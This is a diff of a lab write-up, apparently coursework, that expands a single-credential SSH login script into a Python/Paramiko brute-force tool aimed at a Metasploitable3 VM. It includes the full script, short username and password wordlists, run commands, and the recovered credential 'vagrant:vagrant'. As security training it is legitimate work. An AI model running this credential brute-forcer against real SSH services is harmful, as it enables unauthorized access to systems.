@@ -1,17 +1,28 @@
-# Custom Script – SSH Login with Python
+# Custom Script – SSH Brute-Force with Python
 
-This part shows how we created a simple Python script to log into Metasploitable3 over SSH using default credentials.
+This part shows how we created a custom Python script to perform a brute-force attack on Metasploitable3’s SSH service using multiple usernames and passwords.
+
+---
 
 ## Target Info
 
-- IP Address: 172.28.128.3
-- Port: 22
-- Username: msfadmin
-- Password: msfadmin
+- **IP Address**: 172.28.128.3
+- **Port**: 22
+- **Service**: SSH
+- **Goal**: Discover valid SSH credentials through brute-force using a Python script.
+
+---
 
 ## What We Did
 
-We wrote a basic script using Python and the paramiko library. It connects to the target’s SSH service, logs in with the credentials, and runs the command `whoami` to confirm access.
+We wrote a custom brute-force script in Python using the **Paramiko** library.
+
+- The script reads **usernames** from `users.txt`.
+- It reads **passwords** from `pass.txt`.
+- Tries every possible **username:password** pair.
+- Stops and saves the valid credentials when login is successful.
+
+---
 
 ## The Script (ssh_brute.py)
 
@@ -19,46 +30,101 @@ We wrote a basic script using Python and the paramiko library. It connects to th
 import paramiko
 
 target_ip = "172.28.128.3"
-username = "msfadmin"
-password = "msfadmin"
+port = 22
+
+user_file = "users.txt"
+pass_file = "pass.txt"
+output_file = "valid_credentials.txt"
 
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-try:
-    print(f"[+] Trying {username}:{password}")
-    client.connect(target_ip, username=username, password=password, timeout=5)
-    print("[+] Login successful!")
-
-    stdin, stdout, stderr = client.exec_command("whoami")
-    print("[+] Command output:", stdout.read().decode())
-
-    client.close()
-except paramiko.AuthenticationException:
-    print("[-] Login failed.")
+with open(user_file, 'r') as users, open(pass_file, 'r') as passwords:
+    for username in users:
+        for password in passwords:
+            username = username.strip()
+            password = password.strip()
+            try:
+                print(f"Trying {username}:{password}")
+                client.connect(target_ip, port=port, username=username, password=password, timeout=5)
+                print(f"[+] Success: {username}:{password}")
+                with open(output_file, "w") as valid:
+                    valid.write(f"{username}:{password}\n")
+                client.close()
+                exit()
+            except paramiko.AuthenticationException:
+                print(f"[-] Failed: {username}:{password}")
+            except Exception as e:
+                print(f"[!] Error: {e}")
+        passwords.seek(0)
 ```
+
+---
+
+## Wordlists Used
+
+**users.txt**
+
+```
+admin
+msfadmin
+root
+vagrant
+test
+```
+
+**pass.txt**
+
+```
+password
+123456
+msfadmin
+vagrant
+admin123
+```
+
+---
 
 ## How We Ran It
 
-We saved the script as `ssh_brute.py` inside Kali and ran it using:
-
-```bash
-python3 ssh_brute.py
-```
-
-Before running it, we installed paramiko with:
+1. Installed **Paramiko** in Kali Linux:
 
 ```bash
 sudo apt install python3-paramiko
 ```
 
+2. Saved the script as **ssh_brute.py**.
+
+3. Ran the script in terminal:
+
+```bash
+python3 ssh_brute.py
+```
+
+---
+
 ## Result
 
-The script logged in successfully and showed that the current user was `msfadmin`.
+- The script tested multiple combinations of usernames and passwords.
+- After several failed attempts, it successfully logged in with:
+
+```
+[+] Success: vagrant:vagrant
+```
+
+- The valid credentials were saved to **valid_credentials.txt**.
+
+---
 
 ## Screenshot
 
-We took a screenshot showing the terminal output after running the script.  
-The file is saved as: `custom_script_attack.png`
+We captured a screenshot showing the script successfully finding the credentials.  
+📁 File saved as: **custom_script_attack.png**
 
-This completes Task 1.2 for Phase 1.
+---
+
+## Conclusion
+
+This script demonstrates how brute-force attacks can be automated using simple Python code. It mimics tools like Hydra but is built from scratch for learning and demonstration purposes.
+
+This completes **Task 1.2 for Phase 1**.
